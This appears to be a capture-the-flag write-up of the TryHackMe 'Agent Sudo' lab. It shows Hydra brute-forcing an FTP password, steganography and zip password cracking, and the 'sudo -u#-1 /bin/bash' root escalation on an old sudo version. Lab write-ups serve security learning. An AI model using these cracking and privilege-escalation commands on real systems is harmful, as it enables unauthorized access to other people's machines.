Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```
change user-agent: to R (I used burp suite to capture my request -> edit -> forward it)
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```
25 employees? like alphabet? so let start from A
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```
We know that agent C's (chirs) password is weak, and he have something to do with agent J. I try to get page for `user agent: J` not thing pop up..


We know that Chris pass word is weak, let use Hydra to crack FTP.
```console
bibo318@parrot:~$ hydra -f -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
```
now log in as Chris
```console
bibo318@parrot:~/THM/agent$ ftp $IP

get all the files !!
```console

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
as the message said agent J's login password is somehow stored in the **fake picture**. So I have no choice than try to brute force steghide on the pictures. I found a simple bash script [here](https://gist.github.com/itsecurityco/503970852ac47cd6a3b356590d824a2c) which can be use to brute forcing steghid. copy the script and make it executable (``chmod +x``). Now run the script.

```console
bibo318@parrot:~/THM/agent$ ../../script/steghidebf.sh cutie.png /usr/share/wordlists/rockyou.txt 
Steghide Bruteforce (c) 2017 by Juan Escobar
stegofile: cutie.png
wordlist:  /usr/share/wordlists/rockyou.txt

[+] Information obtained with passphrase: '123456'
steghide: the file format of the file "cutie.png" is not supported.
```
it didnt works... why?
```console
bibo318@parrot:~/THM/agent$ file cutie.png 
cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
bibo318@parrot:~/THM/agent$ binwalk cutie.png

```
ahaaa that what Chris mean with **fake picture**, this file included a zip file. let use `binwalk` to extrack the hidden files.
```console
bibo318@parrot:~/THM/agent$ binwalk -e cutie.png 
bibo318@parrot:~/THM/agent$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt
bibo318@parrot:~/THM/agent$ ls _cutie.png.extracted/
365  365.zlib  8702.zip  To_agentR.txt
```
we need password to be able to extract the *.zip*. we will use `zip2john` to convert it to hash format then use `john` to crack it
```console
bibo318@kali:~# zip2john /home/kali/THM/agent/_cutie.png.extracted/8702.zip > /home/kali/THM/agent/zip2john.txt
bibo318@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt /home/kali/THM/agent/zip2john.txt
```
I got the password and tried to extract the zip it with `xarchiver` but got error. let try with 7z
```console
bibo318@parrot:~/THM/agent/_cutie.png.extracted$ 7z e 8702.zip

Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
use CyberChef magic `QXJlYTUx` -> bas64 -> <password>
```console
bibo318@parrot:~/THM/agent$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
bibo318@parrot:~/THM/agent$ cat message.txt 
Hi <username>,

Glad you find this message. Your login password is <password>

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
ssh to the server and get the flag


to another task, you need to use `scp` or `python` toget the picture and image search it in google, (check hint if ya stuck).
# root
sine the room call `Agent sudo`, so far we didnt do anything with sudo yet. and I know a CVE for sudo which effect sudo versions < **1.8.28**. let check version:
```console
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
BING GO! read more about it [here](sudovulnsbypass.md). let exploit it:
```console
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
```
